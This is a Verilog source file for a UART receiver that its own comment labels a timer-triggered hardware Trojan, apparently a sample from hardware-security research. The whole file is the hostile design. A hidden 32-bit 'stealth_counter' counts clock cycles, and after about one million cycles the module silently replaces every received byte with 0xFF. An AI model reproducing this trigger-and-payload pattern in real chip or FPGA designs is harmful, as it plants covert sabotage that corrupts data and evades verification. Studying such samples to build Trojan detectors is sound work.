// UART Receiver with Timer/Counter Triggered Hardware Trojan (Trojan Model)
module uart_rx (
    input clk,
    input rst_n,
    input rx_serial,
    output reg [7:0] rx_byte,
    output reg rx_done
);
    parameter IDLE = 2'b00, START = 2'b01, DATA = 2'b10, STOP = 2'b11;
    reg [1:0] state;
    reg [2:0] bit_idx;
    reg [7:0] shift_reg;
    reg [31:0] stealth_counter;

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            state <= IDLE;
            rx_done <= 1'b0;
            rx_byte <= 8'b0;
            bit_idx <= 3'b0;
            stealth_counter <= 32'b0;
        end else begin
            stealth_counter <= stealth_counter + 1'b1;
            case (state)
                IDLE: begin
                    rx_done <= 1'b0;
                    if (!rx_serial) state <= START;
                end
                START: state <= DATA;
                DATA: begin
                    shift_reg[bit_idx] <= rx_serial;
                    if (bit_idx == 3'd7) begin
                        bit_idx <= 3'd0;
                        state <= STOP;
                    end else begin
                        bit_idx <= bit_idx + 1'b1;
                    end
                end
                STOP: begin
                    rx_byte <= (stealth_counter > 32'd1000000) ? 8'hFF : shift_reg;
                    rx_done <= 1'b1;
                    state <= IDLE;
                end
            endcase
        end
    end
endmodule
